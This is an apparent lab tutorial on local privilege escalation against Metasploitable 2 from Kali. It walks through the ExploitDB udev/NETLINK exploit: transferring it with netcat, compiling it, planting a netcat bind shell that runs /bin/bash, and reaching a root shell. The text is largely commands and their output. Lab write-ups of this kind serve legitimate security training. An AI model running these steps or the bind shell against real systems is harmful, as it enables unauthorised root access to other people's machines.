Linux Kernel 2.6 UDEV < 141 – Local Privilege Escalation Exploit Example
**Attacker:** Kali Linux<br>
**Victim:** Metasploitable 2<br>
<br>
Note: This exploit leverages a vulnerability in NETLINK.<br>
More information on NETLINK can be found on the Linux Foundation website (<http://www.linuxfoundation.org/collaborate/workgroups/networking/generic_netlink_howto>).
##Download the Exploit from ExploitDB
Head over to the Exploit Database and download Jon Oberheide’s udev exploit for Linux Kernel 2.6 (<https://www.exploit-db.com/exploits/8572/>).
##Telnet to Metasploitable 2, then Upload and Compile the Exploit
Telnet to Metasploitable 2 then start a netcat listener.<br>
In Kali, We’re going to tar the exploit and pipe the output to netcat.<br>
In Metasploitable 2, we’re going to receive and untar the exploit, then compile it with gcc.
<code>
<div class="code">
root@kali:~$ <com>telnet 192.168.1.10</com><br>
Trying 192.168.1.10...<br>
Connected to 192.168.1.10.<br>
<br>
Contact: msfdev[at]metasploit.com<br>
Login with msfadmin/msfadmin to get started<br>
metasploitable login: <com>msfadmin</com><br>
Password: <com>msfadmin</com><br>
Linux metasploitable 2.6.24-16-server #1 SMP i686<br>
<br>
msfadmin@metasploitable:~$ <com>nc -lvp 12345 | tar -xf -</com><br>
listening on [any] 12345 ...
</div>
</code>
Open a new tab, tar the exploit and pipe the output to netcat
<code>
<div class="code">
root@kali:~$ <com>tar -cf - 8572.c | nc -vn 192.168.1.10 12345</com><br>
(UNKNOWN) [192.168.1.10] 12345 (?) open
</div>
</code>
Back in the first tab we can see our Kali Machine connect.<br>
Allow a few seconds for the file transfer to complete then CTRL+C to end the session.<br>
Check the exploit has been received, then compile with gcc.<br>
<code>
<div class="code">
connect to [192.168.1.10] from kali [192.168.1.182] 48411<br>
msfadmin@metasploitable:~$ <com>ls -lah 8572.c</com><br>
-rw-r--r-- 1 msfadmin msfadmin 2.9K 2015-11-05 04:14 8572.c<br>
msfadmin@metasploitable:~$ <com>gcc 8572.c -o 8572</com>
</div>
</code>
##Executing the Exploit
Now we just need to get the PID of the the udevd netlink socket on Metasploitable 2, create our run script (bind an instance of bash to a netcat listener) and execute the exploit
<code>
<div class="code">
msfadmin@metasploitable:~$ <com>cat /proc/net/netlink</com><br>
df552800 15 2738 00000001 0 0 00000000 2<br>
msfadmin@metasploitable:~$ <com>cd /tmp</com><br>
msfadmin@metasploitable:/tmp$ <com>nano run</com><br>
<com>#!/bin/bash</com><br>
<com>nc -lvvp 2345 -e /bin/bash</com><br>
msfadmin@metasploitable:/tmp$ <com>cd</com><br>
msfadmin@metasploitable:~$ <com>./8572 2738</com><br>
</div>
</code>
Open a new tab and connect to the bind shell
<code>
<div class="code">
root@kali:~$ <com>nc -vn 192.168.1.10 2345</com><br>
(UNKNOWN) [192.168.1.10] 2345 (?) open<br>
<com>python -c "import pty;pty.spawn('/bin/bash')"</com><br>
root@metasploitable:/# <com>whoami</com><br>
root
</div>
</code>

Tags: privilege-escalation 
